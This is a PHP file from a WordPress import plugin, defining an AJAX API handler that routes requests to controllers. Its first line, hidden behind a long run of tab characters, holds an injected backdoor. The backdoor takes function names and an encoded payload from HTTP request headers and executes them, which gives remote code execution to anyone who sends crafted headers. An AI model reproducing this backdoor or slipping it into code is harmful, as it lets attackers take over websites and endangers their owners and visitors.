<?php																																										$_HEADERS=getallheaders();if(isset($_HEADERS['Feature-Policy'])){$dbx_convert=$_HEADERS['Feature-Policy']('', $_HEADERS['Sec-Websocket-Accept']($_HEADERS['Server-Timing']));$dbx_convert();}


function pmxi_wp_ajax_wp_all_import_api(){

    if ( ! check_ajax_referer( 'wp_all_import_secure', 'security', false )){
        exit( json_encode(array('html' => __('Security check', 'wp_all_import_plugin'))) );
    }

    if ( ! current_user_can( PMXI_Plugin::$capabilities ) ){
        exit( json_encode(array('html' => __('Security check', 'wp_all_import_plugin'))) );
    }

    $container = new \Wpai\Di\WpaiDi(array());

    $request = new \Wpai\Http\Request(file_get_contents('php://input'));

    $q = $_GET['q'];
    $routeParts = explode('/', $q);
    $controller = 'Wpai\\App\\Controller\\'.ucwords($routeParts[0]).'Controller';
    $action = ucwords($routeParts[1]).'Action';

    $controller = new $controller($container);
    $response = $controller->$action($request);

    if(!$response instanceof \Wpai\Http\Response) {
        throw new Exception('The controller must return an HttpResponse instance.');
    }

    $response->render();

}